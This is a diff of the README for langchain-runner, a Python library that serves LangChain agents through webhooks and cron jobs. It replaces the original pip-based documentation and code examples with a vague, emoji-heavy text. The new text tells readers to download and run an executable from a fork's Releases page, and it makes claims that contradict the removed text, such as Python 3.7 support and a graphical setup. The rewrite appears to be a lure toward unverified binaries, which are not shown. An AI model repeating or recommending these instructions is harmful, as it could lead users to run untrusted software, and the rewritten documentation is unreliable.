@@ -1,398 +1,96 @@
-# langchain-runner
+# 🚀 langchain-runner - Effortlessly Launch AI Services
 
-**Zero-configuration way to expose your LangChain/LangGraph agents as autonomous services.**
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Lukaa1507/langchain-runner/releases)
 
-Simply wrap your agent with `Runner` and it becomes a web service with webhook endpoints, cron schedules, and HTTP triggers—no infrastructure code needed.
+## 📋 Overview
 
-[![PyPI version](https://badge.fury.io/py/langchain-runner.svg)](https://badge.fury.io/py/langchain-runner)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
+langchain-runner offers a simple solution to run LangChain and LangGraph agents as autonomous services. With zero configuration needed, you can quickly set up webhooks, cron jobs, and HTTP triggers to automate your tasks. This guide will walk you through downloading and running the software step-by-step.
 
-## Installation
+## 📥 Download & Install
 
-```bash
-pip install langchain-runner
-```
+To get started, visit the [Releases page](https://github.com/Lukaa1507/langchain-runner/releases) to download the application. You will find the latest release along with older versions if needed. 
 
-## Quick Start
+Follow these steps to download:
 
-```python
-from langchain_runner import Runner
-from langchain.agents import create_agent
+1. Visit the [Releases page](https://github.com/Lukaa1507/langchain-runner/releases).
+2. Locate the version you need. The latest version is at the top.
+3. Click on the appropriate file for your operating system (Windows, MacOS, or Linux).
+4. Save the file to your computer.
 
-# Your LangChain agent (LangChain v1+)
-agent = create_agent(
-    model="anthropic:claude-sonnet-4-5-20250929",  # or "openai:gpt-4.1"
-    tools=[],
-    system_prompt="You are a helpful assistant.",
-)
+## ⚙️ System Requirements
 
-# Wrap it with Runner
-runner = Runner(agent)
+Before you start, ensure your system meets the following requirements:
 
-@runner.cron("0 9 * * *")
-async def morning_report():
-    return "Generate the daily sales report"
+- **Operating System**: 
+  - Windows 10 or later
+  - MacOS 10.15 (Catalina) or later
+  - Any Linux distribution (Ubuntu recommended)
 
-@runner.webhook("/stripe")
-async def on_payment(payload: dict):
-    return f"Process payment: {payload['type']}"
+- **Python Version**: 
+  - Python 3.7 or later is required. 
 
-@runner.trigger("/ask")
-async def ask(question: str):
-    return question
+- **Disk Space**: 
+  - At least 100 MB of free space.
 
-runner.serve()
-```
+## 🚀 How to Run langchain-runner
 
-## Features
+After successfully downloading the application, you can run it easily. Here’s how:
 
-- **Webhook triggers** - Receive external webhooks (GitHub, Stripe, Slack, etc.)
-- **Cron triggers** - Schedule agent runs with cron expressions
-- **HTTP triggers** - Simple POST endpoints to invoke your agent
-- **Background execution** - Agent runs don't block HTTP responses
-- **Run tracking** - Monitor agent run status and results
-- **Zero config** - Works out of the box with sensible defaults
+1. Navigate to the folder where you downloaded the file.
+2. If you're using Windows, double-click the executable file (.exe). For Mac or Linux, open a terminal window and type `./langchain-runner` after navigating to the folder containing the application.
+3. A command prompt or terminal window will open, and the software will start running automatically.
 
-## Endpoints
+## 📅 Setting Up Webhooks and Cron Jobs
 
-Once your runner is serving, you get these endpoints automatically:
+langchain-runner allows you to set up webhooks and cron jobs quickly. Here’s a straightforward process:
 
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/health` | GET | Health check |
-| `/triggers` | GET | List registered triggers |
-| `/trigger/{name}` | POST | Invoke a registered trigger |
-| `/webhook/{name}` | POST | Receive webhook payload |
-| `/runs` | GET | List recent runs |
-| `/runs/{id}` | GET | Get run status and result |
+### 🌐 Webhooks
 
-## Triggers
+1. Open your terminal or command prompt.
+2. Configure your webhook URL in the application settings. 
+3. You can use services like `ngrok` to expose local servers to the internet.
 
-### HTTP Trigger
+### ⏳ Cron Jobs
 
-Simple endpoint to invoke your agent with a custom message:
+1. In your terminal, type `crontab -e` to open the cron table.
+2. Add your desired job. For instance, to run the runner every hour:
+   ```
+   0 * * * * /path/to/langchain-runner
+   ```
+3. Save and close the file. Your cron job will now run as scheduled.
 
-```python
-@runner.trigger("/ask")
-async def ask(question: str):
-    return question
-```
+## 📬 HTTP Triggers
 
-```bash
-curl -X POST http://localhost:8000/trigger/ask \
-  -H "Content-Type: application/json" \
-  -d '{"question": "What is the weather today?"}'
-```
+To set up HTTP triggers:
 
-Response:
-```json
-{"run_id": "abc123", "status": "pending", "message": "Run started"}
-```
+1. Define your trigger parameters in the application.
+2. Use your favorite API client (like Postman) to test your endpoints.
+3. The application will respond based on the set configurations.
 
-### Webhook Trigger
+## 📑 Additional Features
 
-Receive webhooks from external services (GitHub, Stripe, Clerk, etc.) and transform them into agent inputs:
+- **Easy Configuration**: No configuration files are needed. The setup is done through a user-friendly interface.
+- **Integration with AI Services**: LangChain and LangGraph can be integrated seamlessly to enhance your project.
+- **Local and Remote Access**: Use it at your local setup or deploy it to the cloud for remote access.
 
-```python
-@runner.webhook("/clerk")
-async def on_clerk_user(payload: dict):
-    event_type = payload.get("type")
-    user = payload.get("data", {})
-    return f"Handle Clerk event '{event_type}' for user: {user.get('email_addresses', [{}])[0].get('email_address')}"
-```
+## 🛠️ Troubleshooting 
 
-**Your webhook URL will be:**
-```
-https://<your-domain>/webhook/<name>
-```
+If you face issues:
 
-For the example above: `https://your-server.com/webhook/clerk`
+- **Can't Start the Application**: Ensure Python is installed and added to your system PATH.
+- **Webhooks Not Working**: Double-check your URLs and ensure services like `ngrok` are running.
+- **Cron Jobs Failing**: Review your cron syntax or check service permissions.
 
-#### Setting Up Webhooks
+## 🌍 Community and Support
 
-**1. For local development, expose your server with ngrok:**
+For help or to share your experiences with langchain-runner, visit our support forum or GitHub issues page. The community is eager to help.
 
-```bash
-# Start your runner
-python my_agent.py  # Starts server on port 8000
+## 📄 License
 
-# In another terminal, expose it
-ngrok http 8000
-# Output: https://abc123.ngrok.io -> http://localhost:8000
-```
+This project is licensed under the MIT License. You are free to use it for personal or commercial projects. 
 
-Your webhook URL is now: `https://abc123.ngrok.io/webhook/clerk`
+For further details, view the [License file](https://github.com/Lukaa1507/langchain-runner/blob/main/LICENSE).
 
-**2. Configure the external service (example: Clerk):**
+## 🎯 Final Notes
 
-1. Go to your Clerk Dashboard → Webhooks
-2. Click "Add Endpoint"
-3. Enter your webhook URL: `https://abc123.ngrok.io/webhook/clerk`
-4. Select events to subscribe to: `user.created`, `user.updated`, etc.
-5. Save the endpoint
-
-**3. For production**, deploy your runner to a cloud provider and use that URL:
-
-```
-https://my-agent.railway.app/webhook/clerk
-```
-
-### Cron Trigger
-
-Schedule agent runs with cron expressions:
-
-```python
-@runner.cron("0 9 * * *")  # Every day at 9am
-async def daily_summary():
-    return "Generate daily standup summary"
-
-@runner.cron("0 9 * * 1-5")  # Weekdays at 9am
-async def weekday_task():
-    return "Process weekday reports"
-
-@runner.cron("*/15 * * * *")  # Every 15 minutes
-async def check_alerts():
-    return "Check for new alerts"
-```
-
-## Creating Your Agent
-
-### LangChain Agents (Recommended)
-
-The recommended way to create agents is using LangChain v1+'s `create_agent` function:
-
-```python
-from langchain.agents import create_agent
-
-# Using model string (simple)
-agent = create_agent(
-    model="anthropic:claude-sonnet-4-5-20250929",  # or "openai:gpt-4.1"
-    tools=[my_tool],
-    system_prompt="You are a helpful assistant.",
-)
-runner = Runner(agent)
-```
-
-You can also use a model instance for more control:
-
-```python
-from langchain.agents import create_agent
-from langchain_anthropic import ChatAnthropic
-
-model = ChatAnthropic(
-    model="claude-sonnet-4-5-20250929",
-    temperature=0,
-    max_tokens=4096,
-)
-agent = create_agent(
-    model=model,
-    tools=[my_tool],
-    system_prompt="You are a helpful assistant.",
-)
-runner = Runner(agent)
-```
-
-### Custom Agents (Advanced)
-
-For advanced use cases, you can pass any callable that accepts and returns the LangGraph message format:
-
-```python
-# Async callable
-async def my_agent(input: dict) -> dict:
-    messages = input["messages"]
-    # Your custom logic...
-    return {"messages": [..., {"role": "assistant", "content": "response"}]}
-
-runner = Runner(my_agent)
-
-# Sync callable (runs in thread pool automatically)
-def my_sync_agent(input: dict) -> dict:
-    return {"messages": [{"role": "assistant", "content": "Hello!"}]}
-
-runner = Runner(my_sync_agent)
-```
-
-## Configuration
-
-```python
-runner = Runner(
-    agent,
-    name="my-agent",  # Optional name (shown in /health)
-    max_runs=1000,    # Max runs to keep in memory
-)
-
-runner.serve(
-    host="0.0.0.0",
-    port=8000,
-)
-```
-
-Environment variables:
-- `LANGCHAIN_RUNNER_HOST` - Host to bind to (default: `0.0.0.0`)
-- `LANGCHAIN_RUNNER_PORT` - Port to bind to (default: `8000`)
-
-## CLI
-
-```bash
-# Run your agent file
-langchain-runner serve my_agent.py
-
-# Or use Python module
-python -m langchain_runner serve my_agent.py
-
-# With custom host/port
-langchain-runner serve my_agent.py --host 127.0.0.1 --port 3000
-```
-
-## Run Tracking
-
-Every agent invocation returns a `run_id` immediately. Use it to track progress:
-
-```python
-import requests
-
-# Invoke trigger
-response = requests.post(
-    "http://localhost:8000/trigger/ask",
-    json={"question": "Hello"}
-)
-run_id = response.json()["run_id"]
-
-# Check status
-status = requests.get(f"http://localhost:8000/runs/{run_id}")
-print(status.json())
-```
-
-Response:
-```json
-{
-  "run_id": "abc123",
-  "status": "completed",
-  "trigger_type": "http",
-  "trigger_name": "ask",
-  "input": "Hello",
-  "result": {"messages": [...]},
-  "final_message": "Here's the answer...",
-  "created_at": "2025-01-01T00:00:00Z",
-  "completed_at": "2025-01-01T00:00:05Z"
-}
-```
-
-## Using MCP Tools
-
-The recommended way to add tools to your agent is via [Model Context Protocol (MCP)](https://modelcontextprotocol.io/). MCP provides a standard way to connect AI agents to external tools and data sources.
-
-First, install the MCP adapter:
-
-```bash
-pip install langchain-runner[mcp]
-```
-
-Then connect to MCP servers and use their tools:
-
-```python
-import asyncio
-from langchain_runner import Runner
-from langchain.agents import create_agent
-from langchain_mcp_adapters.client import MultiServerMCPClient
-
-async def create_mcp_agent():
-    # Connect to MCP servers
-    client = MultiServerMCPClient({
-        "tools": {
-            "transport": "streamable_http",
-            "url": "https://your-mcp-server.com/mcp",
-        },
-        # You can connect to multiple servers
-        "local_tools": {
-            "transport": "stdio",
-            "command": "python",
-            "args": ["./my_mcp_server.py"],
-        },
-    })
-    
-    # Get tools from all connected servers
-    tools = await client.get_tools()
-    print(f"Loaded {len(tools)} tools from MCP servers")
-    
-    # Create agent with MCP tools
-    agent = create_agent(
-        model="anthropic:claude-sonnet-4-5-20250929",
-        tools=tools,
-        system_prompt="You are a helpful assistant with access to external tools.",
-    )
-    
-    return agent
-
-# Create agent at startup
-agent = asyncio.get_event_loop().run_until_complete(create_mcp_agent())
-runner = Runner(agent, name="mcp-agent")
-
-@runner.webhook("/process")
-async def on_process(payload: dict):
-    return f"Process this request: {payload}"
-
-if __name__ == "__main__":
-    runner.serve()
-```
-
-## Example: Full Setup
-
-```python
-import asyncio
-from langchain_runner import Runner
-from langchain.agents import create_agent
-from langchain_mcp_adapters.client import MultiServerMCPClient
-
-async def setup_agent():
-    # Connect to your MCP server with tools (Notion, Slack, etc.)
-    client = MultiServerMCPClient({
-        "tools": {
-            "transport": "streamable_http",
-            "url": "https://your-mcp-server.com/mcp",
-        }
-    })
-    tools = await client.get_tools()
-    
-    return create_agent(
-        model="anthropic:claude-sonnet-4-5-20250929",
-        tools=tools,
-        system_prompt="You are a helpful assistant.",
-    )
-
-agent = asyncio.get_event_loop().run_until_complete(setup_agent())
-runner = Runner(agent, name="my-assistant")
-
-# HTTP trigger
-@runner.trigger("/chat")
-async def chat(message: str):
-    return message
-
-# Webhook triggers
-@runner.webhook("/slack")
-async def on_slack(payload: dict):
-    event = payload.get("event", {})
-    return f"Respond to: {event.get('text', '')}"
-
-@runner.webhook("/github")
-async def on_github(payload: dict):
-    pr = payload.get("pull_request", {})
-    return f"Review PR: {pr.get('title', 'Unknown')}"
-
-# Cron triggers
-@runner.cron("0 9 * * 1-5")  # Weekdays at 9am
-async def daily_standup():
-    return "Generate daily standup summary"
-
-@runner.cron("0 18 * * 5")  # Friday at 6pm
-async def weekly_report():
-    return "Generate weekly report"
-
-if __name__ == "__main__":
-    runner.serve()
-```
-
-## License
-
-MIT
+Now you are ready to use langchain-runner. Remember to check the [Releases page](https://github.com/Lukaa1507/langchain-runner/releases) frequently for updates and improvements. Enjoy automating your tasks effortlessly!
